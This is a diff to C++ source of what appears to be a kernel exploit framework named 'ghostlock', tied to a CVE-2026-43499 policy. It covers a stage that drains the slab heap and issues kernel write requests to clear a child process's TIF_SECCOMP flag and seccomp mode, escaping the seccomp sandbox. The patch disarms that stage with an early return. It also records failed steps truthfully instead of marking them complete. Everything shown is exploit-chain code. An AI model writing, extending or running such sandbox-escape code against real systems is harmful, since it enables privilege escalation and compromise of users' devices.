@@ -294,6 +294,20 @@ namespace ghostlock::session::backend {
                                         : child_task + ghostlock::profile::task_seccomp_off();
 
             uint32_t w3_attempts = g_exploit_session.profile.w3_attempts();
+            /* Fast refusal. Every W3 request uses WriteMode::SeccompFlags or
+             * SeccompMode, which payload_write_layout() rejects because the
+             * value primitive stores only 0 or a valid kernel pointer. Without
+             * this guard the request would be refused deeper in
+             * prepare_kernel_page() and burn the whole heap-prepare timeout
+             * (240 s by default) before failing. Run-state steps are left
+             * not_start so the record cannot imply W3 ever began. */
+            if (w3_attempts > 0) {
+                pr_warning("W3 disarmed: this build's write primitive cannot express "
+                           "TIF_SECCOMP or the seccomp mode/filter_count word. "
+                           "Set w3_attempts=0 and use the adb/shell flow "
+                           "(docs/W3-SECCOMP-ANALYSIS.md).\n");
+                return false;
+            }
             for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
                 pr_info("W3: TIF_SECCOMP mask + mode attempt %u/%u\n", attempt, w3_attempts);
                 if (attempt == 1) attack::slab_drain();
@@ -302,34 +316,48 @@ namespace ghostlock::session::backend {
                         memory::WriteRequest::make(flags_target, memory::WriteMode::SeccompFlags, 0);
                 Status routed = Cve2026_43499Policy::template attack_write<M>(session, flags_request, "W3: TIF_SECCOMP");
                 if (!routed) {
-                    pr_warning("W3 attempt %u route failed; backing off\n", attempt);
-                    usleep(100000);
-                    continue;
+                    /* Expected: the value primitive cannot express a TIF mask, so
+                     * the layout is rejected before any kernel write. Record the
+                     * failure instead of leaving w3b in_progress (which reads as a
+                     * panic) or claiming success. */
+                    support::run_state::fail("w3b");
+                    pr_warning("W3: TIF_SECCOMP write unsupported by the value primitive; "
+                               "aborting W3 (use the adb/shell flow)\n");
+                    break;
                 }
-                support::run_state::complete("w3b");
                 usleep(g_exploit_session.profile.w3_settle_us());
                 support::run_state::enter("w3c");
                 const memory::WriteRequest mode_request =
                         memory::WriteRequest::make(mode_target, memory::WriteMode::SeccompMode, 0);
                 routed = Cve2026_43499Policy::template attack_write<M>(session, mode_request, "W3: seccomp mode");
                 if (!routed) {
-                    pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
-                    usleep(100000);
-                    continue;
+                    support::run_state::fail("w3c");
+                    support::run_state::fail("w3b");
+                    pr_warning("W3: seccomp mode/filter_count write unsupported by the value "
+                               "primitive; aborting W3 (use the adb/shell flow)\n");
+                    break;
                 }
-                support::run_state::complete("w3c");
                 usleep(g_exploit_session.profile.w3_settle_us());
                 int32_t st = 0;
                 if (waitpid(pipes.child(), &st, WNOHANG) == pipes.child()) {
                     pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
                     pipes.mark_child_exited();
                     child_alive = 0;
+                    support::run_state::fail("w3b");
+                    support::run_state::fail("w3c");
                     break;
                 }
+                /* Only a verified probe counts as a completed step. A route
+                 * returning success only means the write was attempted. */
                 if (victim::verify_seccomp_probe_stage(&w2_context)) {
+                    support::run_state::complete("w3b");
+                    support::run_state::complete("w3c");
                     seccomp_ok = 1;
                     break;
                 }
+                support::run_state::fail("w3b");
+                support::run_state::fail("w3c");
+                pr_warning("W3 attempt %u did not change the child's seccomp state\n", attempt);
                 usleep(g_exploit_session.profile.w3_settle_us());
             }
 
